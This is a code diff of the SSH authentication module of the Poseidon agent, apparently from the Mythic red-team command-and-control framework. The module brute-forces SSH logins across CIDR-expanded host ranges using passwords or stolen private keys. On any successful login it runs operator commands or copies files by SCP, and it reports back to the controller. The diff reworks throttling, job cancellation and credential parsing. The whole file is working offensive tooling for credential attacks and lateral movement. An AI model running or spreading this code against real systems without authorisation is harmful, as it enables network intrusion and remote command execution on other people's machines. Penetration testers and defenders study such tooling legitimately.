@@ -1,18 +1,15 @@
 package sshauth
 
 import (
-	"context"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
+	"os"
 	"strings"
 	"sync"
 	"time"
 
 	// External
 	"golang.org/x/crypto/ssh"
-	"golang.org/x/sync/semaphore"
-
 	// 3rd Party
 	"github.com/tmc/scp"
 
@@ -22,16 +19,6 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/portscan"
 )
 
-var (
-	sshResultChan = make(chan SSHResult)
-)
-
-// SSHAuthenticator Governs the lock of ssh authentication attempts
-type SSHAuthenticator struct {
-	host string
-	lock *semaphore.Weighted
-}
-
 // Credential Manages credential objects for authentication
 type Credential struct {
 	Username   string
@@ -39,16 +26,22 @@ type Credential struct {
 	PrivateKey string
 }
 
+type ExplicitCred struct {
+	Account    string `json:"account"`
+	Realm      string `json:"realm"`
+	Credential string `json:"credential"`
+}
+
 type SSHTestParams struct {
-	Hosts       []string `json:"hosts"`
-	Port        int      `json:"port"`
-	Username    string   `json:"username"`
-	Password    string   `json:"password"`
-	Cred        string   `json:"cred"`
-	PrivateKey  string   `json:"private_key"`
-	Command     string   `json:"command"`
-	Source      string   `json:"source"`
-	Destination string   `json:"destination"`
+	Hosts       []string      `json:"hosts"`
+	Port        int           `json:"port"`
+	Username    string        `json:"username"`
+	Password    string        `json:"password"`
+	Cred        *ExplicitCred `json:"cred,omitempty"`
+	PrivateKey  string        `json:"private_key"`
+	Command     string        `json:"command"`
+	Source      string        `json:"source"`
+	Destination string        `json:"destination"`
 }
 
 type SSHResult struct {
@@ -62,41 +55,18 @@ type SSHResult struct {
 }
 
 // SSH Functions
-func PublicKeyFile(file string) (ssh.AuthMethod, error) {
-	buffer, err := ioutil.ReadFile(file)
-	if err != nil {
-		return nil, err
-	}
-
-	key, err := ssh.ParsePrivateKey(buffer)
-	if err != nil {
-		return nil, err
-	}
-	return ssh.PublicKeys(key), nil
-}
-
 func PublicKeyFileOrContent(input string) (ssh.AuthMethod, error) {
 	var key []byte
 	var err error
 
-	// Check if the input contains the typical private key marker 
-	//if strings.Contains(input, "-----") {
-	//	key = []byte(input) // Treat input as private key content
-	//} else if strings.Contains(input, "Credential: ") {
-	if strings.Contains(input, "Credential: ") {
-		// Handle the case where the input is a string with "Credential: " prefix
-		// such as returned by Mythic Credentials
-		parts := strings.Split(input, "Credential: ")
-		if len(parts) > 1 {
-			key = []byte(parts[1])
-			} 
-		} else {
-		key, err = ioutil.ReadFile(input) // Treat input as a file path
+	if strings.HasPrefix(input, "-----BEGIN") {
+		key = []byte(input)
+	} else {
+		key, err = os.ReadFile(input) // Treat input as a file path
 		if err != nil {
 			return nil, err
 		}
 	}
-
 	parsedKey, err := ssh.ParsePrivateKey(key)
 	if err != nil {
 		return nil, err
@@ -104,7 +74,7 @@ func PublicKeyFileOrContent(input string) (ssh.AuthMethod, error) {
 	return ssh.PublicKeys(parsedKey), nil
 }
 
-func SSHLogin(host string, port int, cred Credential, debug bool, command string, source string, destination string) {
+func SSHLogin(host string, port int, cred Credential, debug bool, command string, source string, destination string, sshResultChan chan SSHResult) {
 	res := SSHResult{
 		Host:     host,
 		Username: cred.Username,
@@ -162,9 +132,12 @@ func SSHLogin(host string, port int, cred Credential, debug bool, command string
 			res.Success = false
 			res.Status = err.Error()
 			res.CopyStatus = "Failed to copy: " + err.Error()
-		} else {
-			res.CopyStatus = "Successfully copied"
+			sshResultChan <- res
+			return
 		}
+		res.CopyStatus = "Successfully copied"
+		sshResultChan <- res
+		return
 	}
 	if command != "" {
 		modes := ssh.TerminalModes{
@@ -180,6 +153,7 @@ func SSHLogin(host string, port int, cred Credential, debug bool, command string
 			sshResultChan <- res
 			return
 		}
+		//log.Printf("waiting for output from command after successful auth\n")
 		output, err := session.Output(command)
 		if err != nil {
 			res.Success = false
@@ -187,49 +161,59 @@ func SSHLogin(host string, port int, cred Credential, debug bool, command string
 		} else {
 			res.Output = string(output)
 		}
+		//log.Printf("got output from command")
 	} else {
 		res.Output = ""
 	}
 	sshResultChan <- res
+	//log.Printf("sent output from session")
+	return
 }
 
-func (auth *SSHAuthenticator) Brute(port int, creds []Credential, debug bool, command string, source string, destination string) {
-	wg := sync.WaitGroup{}
-
+func SSHBruteHost(host string, port int, creds []Credential, debug bool, command string, source string, destination string, sshResultChan chan SSHResult) {
 	for i := 0; i < len(creds); i++ {
-		auth.lock.Acquire(context.TODO(), 1)
-		wg.Add(1)
-		go func(port int, cred Credential, debug bool, command string, source string, destination string) {
-			SSHLogin(auth.host, port, cred, debug, command, source, destination)
-			wg.Done()
-			auth.lock.Release(1)
-		}(port, creds[i], debug, command, source, destination)
+		SSHLogin(host, port, creds[i], debug, command, source, destination, sshResultChan)
 	}
-	wg.Wait()
 }
 
-func SSHBruteHost(host string, port int, creds []Credential, debug bool, command string, source string, destination string) {
-	var lim int64 = 100
-	auth := &SSHAuthenticator{
-		host: host,
-		lock: semaphore.NewWeighted(lim),
-	}
-	auth.Brute(port, creds, debug, command, source, destination)
-}
-
-func SSHBruteForce(hosts []string, port int, creds []Credential, debug bool, command string, source string, destination string) []SSHResult {
-	for i := 0; i < len(hosts); i++ {
-		go SSHBruteHost(hosts[i], port, creds, debug, command, source, destination)
-	}
+func SSHBruteForce(hosts []string, port int, creds []Credential, debug bool, command string, source string, destination string, job *structs.Job) []SSHResult {
+	throttleRoutines := 10
+	throttler := make(chan bool, throttleRoutines)
+	wg := sync.WaitGroup{}
+	sshResultChan := make(chan SSHResult, len(hosts))
 	var successfulHosts []SSHResult
 	for i := 0; i < len(hosts); i++ {
-		res := <-sshResultChan
-		//if res.Success {
-		//	successfulHosts = append(successfulHosts, res)
-		//}
-		successfulHosts = append(successfulHosts, res)
+		//log.Printf("starting loop for host: %s\n", hosts[i])
+		throttler <- true // blocking call if we're full
+		if *job.Stop > 0 {
+			break
+		}
+		wg.Add(1)
+		go func() {
+			defer func() {
+				//log.Printf("finished scanning: %s\n", hosts[i])
+				wg.Done()
+				<-throttler // when we're done, take one off the queue so somebody else can run
+			}()
+			if *job.Stop > 0 {
+				return
+			}
+			//log.Printf("starting to scan: %s\n", hosts[i])
+			SSHBruteHost(hosts[i], port, creds, debug, command, source, destination, sshResultChan)
+		}()
 	}
-	return successfulHosts
+	//log.Printf("waiting for all scans to finish\n")
+	wg.Wait()
+	for {
+		select {
+		case res := <-sshResultChan:
+			//log.Printf("got result of scan for: %s\n", res.Host)
+			successfulHosts = append(successfulHosts, res)
+		case <-time.After(time.Second * 2):
+			//log.Printf("breaking after time\n")
+			return successfulHosts
+		}
+	}
 }
 
 func Run(task structs.Task) {
@@ -240,9 +224,7 @@ func Run(task structs.Task) {
 	// log.Println("Task params:", string(task.Params))
 	err := json.Unmarshal([]byte(task.Params), &params)
 	if err != nil {
-		msg.UserOutput = err.Error()
-		msg.Completed = true
-		msg.Status = "error"
+		msg.SetError(err.Error())
 		task.Job.SendResponses <- msg
 		return
 	}
@@ -255,7 +237,7 @@ func Run(task structs.Task) {
 		return
 	}
 
-	if params.Password == "" && params.PrivateKey == "" && params.Cred == "" {
+	if params.Password == "" && params.PrivateKey == "" && params.Cred == nil {
 		msg.UserOutput = "Missing password parameter"
 		msg.Completed = true
 		msg.Status = "error"
@@ -275,27 +257,26 @@ func Run(task structs.Task) {
 	for i := 0; i < len(params.Hosts); i++ {
 		newCidr, err := portscan.NewCIDR(params.Hosts[i])
 		if err != nil {
+			//log.Println(err)
 			continue
-		} else {
-			// Iterate through every host in hostCidr
-			for j := 0; j < len(newCidr.Hosts); j++ {
-				totalHosts = append(totalHosts, newCidr.Hosts[j].PrettyName)
-			}
-			// cidrs = append(cidrs, newCidr)
+		}
+		// Iterate through every host in hostCidr
+		for j := 0; j < len(newCidr.Hosts); j++ {
+			totalHosts = append(totalHosts, newCidr.Hosts[j].PrettyName)
 		}
 	}
 
-	if params.Port == 0 {
+	if params.Port <= 0 {
 		params.Port = 22
 	}
 
 	// Handle Cred vs PrivateKey
-	var cred Credential 
-	if params.Cred != "" { // use Cred if provided
+	var cred Credential
+	if params.Cred != nil { // use Cred if provided
 		cred = Credential{
 			Username:   params.Username,
 			Password:   params.Password,
-			PrivateKey: params.Cred,
+			PrivateKey: params.Cred.Credential,
 		}
 	} else { // use PrivateKey if provided
 		cred = Credential{
@@ -305,25 +286,22 @@ func Run(task structs.Task) {
 		}
 	}
 
-  // log.Println("Beginning brute force...")
-	results := SSHBruteForce(totalHosts, params.Port, []Credential{cred}, false, params.Command, params.Source, params.Destination)
+	// log.Println("Beginning brute force...")
+	results := SSHBruteForce(totalHosts, params.Port, []Credential{cred}, false, params.Command, params.Source, params.Destination, task.Job)
 	// log.Println("Finished!")
 	if len(results) > 0 {
 		data, err := json.MarshalIndent(results, "", "    ")
 		// // fmt.Println("Data:", string(data))
 		if err != nil {
-			msg.UserOutput = err.Error()
-			msg.Completed = true
-			msg.Status = "error"
-			task.Job.SendResponses <- msg
-			return
-		} else {
-			// fmt.Println("Sending on up the data:\n", string(data))
-			msg.UserOutput = string(data)
-			msg.Completed = true
+			msg.SetError(err.Error())
 			task.Job.SendResponses <- msg
 			return
 		}
+		// fmt.Println("Sending on up the data:\n", string(data))
+		msg.UserOutput = string(data)
+		msg.Completed = true
+		task.Job.SendResponses <- msg
+		return
 	} else {
 		// log.Println("No successful auths.")
 		msg.UserOutput = "No successful authentication attempts"
@@ -331,5 +309,4 @@ func Run(task structs.Task) {
 		task.Job.SendResponses <- msg
 		return
 	}
-
 }
